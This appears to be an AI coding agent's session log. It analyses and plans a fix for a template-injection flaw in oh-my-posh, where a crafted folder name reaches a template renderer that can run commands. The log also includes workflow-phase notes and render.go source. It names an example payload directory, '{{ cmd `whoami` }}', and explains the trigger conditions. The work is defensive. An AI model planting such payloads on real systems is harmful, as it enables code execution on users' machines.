`src/config/default.go:49-58` defines a PATH segment with `options.Style: "folder"` and template `" \uea83 {{ path .Path .Location }} "`. The vulnerable render is **independent of the segment's configured template** — `setStyle()` runs inside `Enabled()` (`path.go:151`) before the segment template is ever evaluated, so `pt.Path` is already compromised by the time `{{ path .Path .Location }}` or `{{ .Path }}` reads it. The AI-CLI configs (`statuslineCLIConfig`, `default.go:240-251`, used by Claude/CopilotCLI) also carry a PATH segment and are equally affected.

## Secondary claim (`src/segments/options/map.go`) — NOT the same vulnerability

`Map.Template` (`src/segments/options/map.go:102-116`) does call `template.Render(value, context)` with the same func map, but `value` is a **configuration option value** authored by the config owner (`m.String(option, ...)`), not attacker-controlled filesystem data. It is a single evaluation of a trusted config string — the intended "templated option" feature — not a double-evaluation of a composed string containing external data. Classify it as **different pattern / not applicable**, unless a caller were to feed untrusted data in as an option value (none in the path flow does).

## Root cause — the report's framing is correct, and narrow

The defect is precisely "**path.go re-renders an already-composed display string as a template**" (`path.go:285`). It is not a property of the template engine (which is behaving as designed) nor of the func map alone. The other `template.Render` calls in path.go render only *config-author* inputs against `pt` and are safe:
- `getMaxWidth` :296 (the `max_width` option)
- `getFolderSeparator` :323 (`folder_separator_template`)
- `setMappedLocations` :655 (mapped-location keys)

None of these splice raw folder names; **`:285` is the unique sink** in this trace that renders external filesystem data. I found no other call site combining untrusted external data + full-func-map re-render.

## Notes for fix scoping (analysis only)
- The `escape` helper already exists at `path.go:702-705` and is the natural place brace-neutralization would live, but it currently only runs inside `replaceMappedLocations` — folder names produced by `splitPath` bypass it, and `gitdir`/`folder_format` values applied via `fmt.Sprintf` also bypass it.
- `Path.Format` (`path.go:227-240`, exposed to templates as `{{ .Format $rel }}` in the CLI configs) calls `colorizePath` but does **not** re-render, so it is not itself a second sink — though its input path components share the same unescaped origin.
- Because the render gate needs literal `{{`+`}}`, any fix that escapes/neutralizes braces in the raw folder-name components before composition, or renders the configured sub-templates individually instead of re-parsing the whole composed string, closes it without removing the "templated options" feature that `#6279`/`b88ffc8d` added.

All findings are from reading the code; no files were modified.

content.text:
Confirmed. Report:

## Root cause

`src/segments/path.go:285` unconditionally re-renders the fully composed path string as a Go template, after unescaped, attacker-controlled folder names have already been spliced in:

```go
if txt, err := template.Render(pt.Path, pt); err == nil {
    pt.Path = txt
}
```

Chain (all in `src/segments/path.go` unless noted):
- `:185` `pt.pwd = pt.env.Pwd()` — raw filesystem cwd, attacker-controlled if they control a directory name.
- `:702-705` `escape` only neutralizes `<`/`>` (for the mapped-location feature); it never touches `{{`/`}}`.
- `:951-984` `splitPath` stores each `Folder.Name` raw, no brace sanitization.
- `:941` `colorizePath` does `fmt.Sprintf(folderFormat, element)` (`folderFormat` defaults to `"%s"`), so names land verbatim in `pt.Path`.
- `:285` runs after the full style switch (`:255-282`) — every path style hits it, not a subset. It's outside `Enabled()`'s style branch, so even the default config's `folder` style (just the cwd's own name) is enough to trigger it.
- `render.go:95` → `src/template/func_map.go:12-56` is the same shared func map everywhere — includes `cmd` (`func_map.go:28` → `src/template/cmd.go:5-8`, runs `env.RunCommand`), plus `readFile`/`stat`/`glob`. No sandboxed variant exists for this call.
- Gate: `src/template/text.go:36` requires literal `{{` and `}}` in the string, so only a directory actually named with template syntax triggers it — normal paths are untouched.

Default config confirmed affected: `src/config/default.go:49-58` has a `folder`-style path segment. `setStyle()` runs before the segment's own template (e.g. `{{ .Path }}`) is evaluated — `pt.Path` is already poisoned by then, independent of the segment's configured template.

## Secondary claim (`options/map.go`) — not the same bug

`src/segments/options/map.go:102-116` renders `template.Render(value, context)` too, but `value` is a config-author-supplied option string, not filesystem-derived. Single trusted-input render, working as intended. Different pattern, not a vuln.

## Scope

**In scope for fix:** the single sink at `path.go:285`. Fix direction (per report, confirmed sound): stop re-parsing the whole composed `pt.Path` string. Either render the configured sub-templates (`folder_separator_template`, `mapped_locations`, `folder_format`) individually against their own trusted inputs and concatenate with the literal (unescaped) folder names, or neutralize `{{`/`}}` in raw folder-name components before splicing, or use a func map without `cmd`/`readFile`/`stat`/`glob` for this pass.

**Out of scope:** `options/map.go` (not vulnerable), the other three `template.Render` calls in path.go (`:296` max_width, `:323` folder_separator_template, `:655` mapped_locations) — all render trusted config-author input only, not touched.

## Open question

Which fix direction do you want: (a) stop re-rendering the composed path and instead render sub-templates individually against trusted inputs (preserves current templating feature, more surgical), or (b) escape `{{`/`}}` in raw folder-name components at the source (`splitPath`), simpler patch, one point of truth for all future callers. (a) matches upstream's likely intent but touches more of `colorizePath`; (b) is a smaller diff and defense-in-depth even if another sink appears later.

Go ahead with a fix, and if so which direction?

content.content:
1	# Phase 3 — Delegate
2	
3	Match the executor to the task, not the other way around. The point is cost and speed without
4	losing quality — the coordinator stays accountable for the result.
5	
6	## Executor matrix
7	
8	Tier definitions and per-vendor model examples: [model-tiers.md](model-tiers.md).
9	
10	| Task profile                                             | Executor                                                       |
11	| ---------------------------------------------------------- | ------------------------------------------------------------ |
12	| Trivial: mechanical edit, config tweak, typo, doc update  | Do it directly, or batch on a trivial-tier model              |
13	| Standard, well-specified implementation                   | Coordinator itself, or a same-tier subagent for parallelism   |
14	| Hits an escalation trigger (see [escalate.md](escalate.md)) | Escalation-tier subagent, for that one specific question    |

# Phase 3 — Delegate

Match the executor to the task, not the other way around. The point is cost and speed without
losing quality — the coordinator stays accountable for the result.

## Executor matrix

Tier definitions and per-vendor model examples: [model-tiers.md](model-tiers.md).

| Task profile                                             | Executor                                                       |
| ---------------------------------------------------------- | ------------------------------------------------------------ |
| Trivial: mechanical edit, config tweak, typo, doc update  | Do it directly, or batch on a trivial-tier model              |
| Standard, well-specified implementation                   | Coordinator itself, or a same-tier subagent for parallelism   |
| Hits an escalation trigger (see [escalate.md](escalate.md)) | Escalation-tier subagent, for that one specific question    |

- The coordinator typically runs at implementer tier itself, so standard tasks are usually
  executed directly rather than delegated. Delegate anyway when there's real parallelism —
  independent tasks, each in its own worktree — or to shed trivial mechanical work onto a
  cheaper model.
- Escalation is never the default path for "ambiguous" or "architectural" — it fires only on the
  concrete triggers in [escalate.md](escalate.md), and only for the specific question, not the
  whole task.

## What a delegation carries

Hand the subagent its full pinned spec from Phase 2, plus:

- The verification commands it must run and pass before reporting done.
- The instruction to report what it changed and what it verified — not just "done".
- The instruction to stop and report when it hits something the spec does not cover, instead of
  improvising scope.

## What is never delegated downward

Analysis, final verification, and delivery never go to an implementer — they stay with the
coordinator or go up to Escalation tier for a specific question:

- Analysis and root-cause work (Phase 1).
- Final verification (Phase 5) — an implementer's green run is a claim, not a result.
- Commits, history rewrites, pushes, and user-facing reporting (Phase 6) — these stay with the
  coordinator regardless of tier; they're about accountability, not capability, so they never go
  to Escalation tier either.

file.content:
# Phase 2 — Plan

Turn the approved analysis into an executable plan. The quality bar: an implementer-tier model
must be able to execute each task without asking questions.

## Pin the spec

Write the spec down before delegating anything. It contains:

- The decided approach — including decisions already made, so the implementer does not relitigate
  them.
- Files to touch, and the entry points to start from.
- Constraints: style rules, patterns to follow (point at existing code), performance or
  compatibility requirements.
- Verification commands the implementer must run locally (build, tests, lint).
- Explicit non-goals: what the task must NOT change. This is what keeps subagents from wandering.

## Split into tasks

- One task = one self-contained unit an implementer can finish and verify on its own.
- Mark which tasks are independent and which consume another task's output. Parallelize the
  independent ones; sequence the rest. When in doubt, sequence — a merge conflict between two
  parallel subagents costs more than the parallelism saves.
- Documentation updates belong to the task that changes the behavior, not to a separate task.

## Decide the workspace per task

- Main working tree: when the task depends on uncommitted local changes, or when you will review
  and commit the result in the current session.
- Isolated worktree: everything else, especially parallel tasks — they must never share a
  working tree.

## Output of this phase

A task list where each entry names its executor tier (see Phase 3), its workspace, its
dependencies, and carries its pinned spec.

content.thinking:
So the escape sequences for `<` and `>` aren't about security—they're a practical workaround to prevent folder names containing literal angle brackets from accidentally triggering the color tag parser in the ANSI writer, which would otherwise mangle the output.

The fix should follow the same pattern: escape `{{` and `}}` sequences from the raw path before it reaches the template renderer at line 285. This reuses the established escape-at-source approach and maintains architectural consistency. The tricky part is that this escape function also feeds into the display path shown in the prompt, so I need to be careful not to mangle folder names that legitimately contain single braces—those are common in real projects like `{build}` directories.

The solution is to target only the dangerous `{{` and `}}` patterns, not all braces. I can replace `{{` with `{ {` and `}}` with `} }` (inserting spaces to break the adjacency), which keeps the display nearly identical while preventing the template renderer from seeing the consecutive double-brace sequences it needs to trigger variable substitution. There's a boundary-recombination risk if the folder separator is empty — two individually-escaped folder names like "a{" and "{b" would concatenate to "a{{b", reintroducing the dangerous delimiter pattern. This same class of vulnerability exists in the angle-bracket escaping scheme used for anchor regex validation. The escaping actually happens on the full relative path as a single string before it gets split into individual folder elements, so any "{{" boundary issue would need to span across real filesystem folder names joined by the OS separator, which is a much narrower edge case than I initially considered.

But a folder name itself could literally contain "{{" as part of its actual name — like a directory named "{{ cmd `whoami` }}" — and that's where the real vulnerability lies. When we escape the concatenated relative path string, we're scanning through something like "parent_dir/{{ cmd `whoami` }}/child_dir" and replacing all occurrences of "{{" with "{ {", which would catch that embedded attack pattern. the real concern is whether splitting on the OS separator could create new brace adjacencies across the split boundary — but it can't, since the split removes the separator character itself, so any "{{" pattern that existed in the escaped string would have to span across that removed separator to be created, which is impossible. Each folder name is just a substring of the already-escaped relative path, so the escaping logic has already handled any braces within that segment. is a "/" between the two "{" chars, so they're not adjacent in the raw string and won't trigger a false positive. The real risk emerges when colorizePath joins the path elements back together for display using a user-configurable folderSeparator, which could potentially create the "{{" pattern at the boundaries between elements. So the real vulnerability here is narrower than it first appears — an attacker would need to craft two nested directories with names that end and begin with single braces respectively, and the victim would have to explicitly set the folder separator to empty, which creates a "{{" at the join point that wasn't present in either escaped component individually. It's a genuine risk but requires both an unusual configuration choice and deliberate directory naming by the attacker.

This is worth documenting as a residual risk in the report, similar to how the existing chevron-escaping strategy has its own boundary-case weaknesses that the codebase already accepts. The primary vulnerability with default settings is closed, so I won't over-engineer a fix for an edge case that requires non-default configuration.

Actually, there's a more robust approach: instead of escaping at the split-path stage, I could neutralize the template delimiters in the final composed path string right before rendering, which would let the legitimate templated features still resolve while preventing injection. That's closer to where the actual concatenation happens.

But wait — the separator and mapped-location features are already pre-rendered into concrete strings through their own template calls before they get concatenated into the path. So by the time we hit the render at line 285, the path should be fully composed from already-rendered strings plus raw folder names, meaning there shouldn't be any legitimate template syntax left to process. The line-285 render might be defensive, or it's handling template syntax that lives within the format config strings themselves.

So the real question is: what's line 285 actually for? Looking back at the commit that added templating support, the intent was to let users put template expressions in things like FolderSeparatorTemplate or mapped-location — but those already have dedicated render calls. The line-285 render might exist to handle cases where the format options contain template syntax meant to reference {{ .Path }}, or where the root path itself or other logic embeds something that looks like a template.

Given how deep this analysis goes, the safest approach is to neutralize the `{{`/`}}` characters in the untrusted filesystem components (root and relative paths) at the same point where the existing chevron-escaping happens, reusing the established pattern in the codebase. This aligns with what the user suggested — escaping at the source. I'll note the empty-separator edge case as a known follow-up rather than trying to solve everything at once, keeping the fix minimal and surgical.

Actually, I'm reconsidering the boundary case — I could escape each folder element name individually when it's set during the path split, but that's functionally equivalent to escaping the whole string beforehand since real separators already intervene. The real risk is concatenation at display time with a configurable empty separator, which is separate from where the per-name escaping happens. To fully close that gap, I'd need to apply the neutralization to the final composed path after colorization, not just the individual components.

The cleanest fix would be to neutralize the problematic template syntax in the fully-composed path string right before rendering at line 285, but I have to be careful not to break any legitimate template syntax that should actually be evaluated there — though based on my analysis, there shouldn't be any legitimate need for un-rendered templates to reach that point if config-level templates already resolve independently. The risk is that removing or neutralizing everything there could break existing behavior that relies on this in ways I haven't fully identified without digging deeper into the history.

Given the time constraints and the user's preference for escaping at the source in raw folder names — which is explicit, safe, and minimal — I'll extend the existing escape logic in the replaceMappedLocations function to also neutralize the double-brace characters the same way it already handles angle brackets, then add a test to cover this. I'll note the edge case around empty separators in the config as a known limitation.

But actually, reconsidering this — since this is a real RCE vulnerability in a project the user maintains, maybe I should be more thorough about finding the best fix that balances safety with minimal breakage. Let me check what the template render function's funcMap actually contains. let me look at the render.go signature to see if there's a way to pass a custom function map.

1	package template
2	
3	import (
4		"bytes"
5		"errors"
6		"reflect"
7		"sort"
8		"strings"
9		"text/template"
10		"unicode"
11		"unicode/utf8"
12	
13		"github.com/jandedobbeleer/oh-my-posh/src/cache"
14		"github.com/jandedobbeleer/oh-my-posh/src/generics"
15		"github.com/jandedobbeleer/oh-my-posh/src/log"
16	)
17	
18	type Data any
19	
20	type context struct {
21		Data
22		Getenv func(string) string
23		cache.Template
24	}
25	
26	func (c *context) init(t *Text) {
27		c.Data = t.context
28		c.Getenv = env.Getenv
29		c.Template = *Cache
30	}
31	
32	var (
33		renderPool *generics.Pool[*renderer]
34	)
35	
36	// renderer holds only per-render mutable state: an output buffer and a context.
37	// The parsed template is now looked up from the shared parsedTemplates cache.
38	type renderer struct {
39		context *context
40		buffer  bytes.Buffer
41	}
42	
43	func (t *renderer) release() {
44		t.buffer.Reset()
45		t.context.Data = nil
46		renderPool.Put(t)
47	}
48	
49	// templateCacheKey returns the key used to look up a cached *template.Template.
50	// It encodes the raw (unpatched) template text and, when context is non-nil,
51	// the reflect.Type of the context so that two different struct types whose
52	// patchTemplate output would differ (via hasField) get separate cache entries.
53	// For map[string]any contexts the key also includes the sorted exported key
54	// names, since patchTemplate output depends on which keys are present.
55	func templateCacheKey(rawText string, ctx any) string {
56		if ctx == nil {
57			return rawText
58		}
59	
60		t := reflect.TypeOf(ctx)
61		if t.Kind() == reflect.Map {
62			if m, ok := ctx.(map[string]any); ok {
63				keys := make([]string, 0, len(m))
64				for k := range m {
65					if r, _ := utf8.DecodeRuneInString(k); unicode.IsUpper(r) {
66						keys = append(keys, k)
67					}
68				}
69				sort.Strings(keys)
70				return rawText + "\x00" + t.String() + "\x00" + strings.Join(keys, "\x01")
71			}
72		}
73	
74		return rawText + "\x00" + t.String()
75	}
76	
77	// parsedTemplate returns a fully-parsed *template.Template for text.
78	// The first call for a given key parses and stores it; subsequent calls
79	// return the cached value. Concurrent first-renders of the same template
80	// may both parse, but LoadOrStore ensures only one result is shared.
81	func parsedTemplate(text *Text) (*template.Template, error) {
82		// Key on the raw, unpatched template text plus the context type so that
83		// cache hits can skip patchTemplate entirely: patching is only needed
84		// the first time a given (raw template, context type) pair is seen.
85		key := templateCacheKey(text.template, text.context)
86	
87		if cached, ok := parsedTemplates.Load(key); ok {
88			return cached.(*template.Template), nil
89		}
90	
91		// Cache miss: patch the raw template into its executable form.
92		text.patchTemplate()
93	
94		// Parse into a fresh template with the shared func map and settings.
95		tmpl, err := template.New("cache").Funcs(funcMap()).Parse(text.template)
96		if err != nil {
97			return nil, err
98		}
99	
100		// Store; if another goroutine already stored an equivalent template, use theirs.
101		actual, _ := parsedTemplates.LoadOrStore(key, tmpl)
102		return actual.(*template.Template), nil
103	}
104	
105	func (t *renderer) execute(text *Text) (string, error) {
106		tmpl, err := parsedTemplate(text)
107		if err != nil {
108			log.Error(err)
109			return "", errors.New(InvalidTemplate)
110		}
111	
112		t.context.init(text)
113	
114		err = tmpl.Execute(&t.buffer, t.context)
115		if err != nil {
116			log.Error(err)
117			return "", errors.New(IncorrectTemplate)
118		}
119	
120		output := t.buffer.String()
121	
122		// issue with missingkey=zero ignored for map[string]any
123		// https://github.com/golang/go/issues/24963
124		output = strings.ReplaceAll(output, "<no value>", "")
125	
126		return output, nil
127	}

The gate checks whether both `{{` and `}}` appear anywhere in the template string, not necessarily as matching pairs. Breaking the literal `{{` substring by inserting a space prevents that specific occurrence from being detected, but if multiple malicious folder names each contribute their own `{{` sequences, I need to break all of them—which the replace-all approach handles since it processes every occurrence.

For the fix, I'm modifying the escape closure to also break `{{` and `}}` by inserting a zero-width space between the characters. This approach preserves the visual appearance of folder names in the terminal while definitively breaking the two-character adjacency that the Contains check relies on, since `{\u200B{` no longer contains the contiguous substring `{{`. Zero-width spaces have broad terminal support and shouldn't cause rendering artifacts in most environments.

However, there's a subtle risk: zero-width spaces count as a rune in Go's len() and UTF-8 calculations even though they render with zero width, which could break width-sensitive calculations elsewhere in oh-my-posh like statusline padding or path truncation logic that assumes character counts match visual width. A simpler alternative would be inserting a visible space instead, which trades some visual fidelity for predictability and safety across all terminals and width calculations.

Actually, looking at the existing precedent with how "<" and ">" are already escaped (changing visible width from 1 to 3 characters), the codebase already accepts width changes for escaped characters. So the most consistent approach would be to handle "{" and "}" the same way—escaping each individually rather than just targeting the "{{" pair, matching the per-character granularity of the existing escape logic. Single braces are actually legal and common in folder names across all platforms (like "{repo}", route groups, or template scaffolds with double braces), so naively escaping every brace would mangle legitimate directory names — that's a worse problem than the ambiguity it solves.

The better approach is surgical: only escape the specific dangerous pattern of adjacent braces "{{" or "}}" that actually triggers the template rendering gate, leaving unpaired single braces completely untouched. I'll replace those literal double-brace sequences with a simple, readable escape marker.

The cleanest solution is inserting a space between the braces: "{{" becomes "{ {" and "}}" becomes "} }". This breaks the adjacency that the Render gate and Go template lexer require, keeps both original characters visible and recognizable, makes it immediately obvious to a user that something's been escaped (similar to how "<<>" looks intentionally-escaped), and avoids invisible Unicode that could silently break width calculations elsewhere in the system.

I'm implementing an escape function that first handles chevron characters to prevent unintended text styling, then breaks up the template delimiters by inserting spaces between the braces.

I need to verify how strings.NewReplacer handles overlapping patterns — specifically, when a folder name contains triple braces like "{{{", the replacer scans left-to-right and applies non-overlapping replacements, so it would match the first "{{" pair, replace it, then continue scanning from where that replacement ended rather than re-scanning the output. is at position 0, treating "{" at position 1 as a literal character, then the action starts at position 1 with "{{" and continues until it finds the matching "}}". So for "{{{X}}}", the lexer would parse it as a literal "{" followed by an action "{{X}}" — meaning the triple-brace case doesn't actually create a valid nested template, it just leaves a stray opening brace before the action. This means my replacement strategy of converting "{{" to "{ {" would still work because the lexer's behavior depends on finding the exact "{{" substring, and once I've broken that pattern, the remaining braces are just literals. the resulting different structure (content shifted by one extra "{") generally invalidates the parsed action syntax anyway. But I shouldn't rely on this being coincidentally safe — better to make the escape provably robust regardless of run length: fully neutralize ANY run of 2+ consecutive "{" or "}" characters, not just literal "{{"/"}}" pairs via NewReplacer (which has known non-overlapping/no-rescan limitations for runs). I'm thinking the simplest robust implementation would be to use a regex or manual loop to handle this comprehensively.

I'm writing a function that scans through the string character by character, inserting a space after any brace that's immediately followed by an identical brace character. This guarantees no two consecutive identical braces can survive anywhere, regardless of how long the run is — so "{{{{" becomes "{ { { {" with spaces breaking up every pair. The byte values 0x7B and 0x7D (the braces themselves) never appear as continuation bytes in valid UTF-8, so this approach is safe even with multi-byte sequences elsewhere in the string. I'm going to implement this as a small helper function and integrate it into the existing escape closure alongside the chevron replacer, then modify the path.go file around line 702-705 in the `replaceMappedLocations` function to handle breaking up consecutive brace runs.

I also need to add tests in path_test.go to verify that folder names containing template injection payloads like "{{ cmd `whoami` }}" don't get executed after resolution, while legitimate single-brace folder names pass through unchanged. I'll check the existing test structure to match the style conventions, and since this is a security-sensitive single-file change, I'll handle the implementation directly rather than delegating.
